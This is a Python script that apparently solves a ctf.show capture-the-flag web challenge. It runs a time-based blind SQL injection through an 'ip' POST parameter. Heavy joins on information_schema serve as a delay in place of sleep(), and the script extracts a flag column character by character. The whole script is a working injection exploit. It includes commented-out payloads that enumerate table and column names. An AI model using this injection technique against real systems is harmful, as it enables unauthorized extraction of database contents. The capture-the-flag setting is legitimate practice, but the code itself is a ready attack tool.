import time

import requests

url = "http://c887df7a-485a-4828-89e3-abb579f63434.challenge.ctf.show/api/"

strr = "1234567890{}-qazwsxedcrfvtgbyhnujmikolp,"
# payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxca' limit 1,1"
payload = "select flagaabc from ctfshow_flagxca"
cnt = 1
res = ""
while True:
    print(cnt)
    for i in strr:
        data = {
            'ip': f"1) or if(substr(({payload}),{cnt},1)='{i}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H, information_schema.schemata I),1",
            'debug': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=2)
        except Exception as e:
            res += i
            print('[*]' + res)
            cnt += 1
            time.sleep(3)
            break
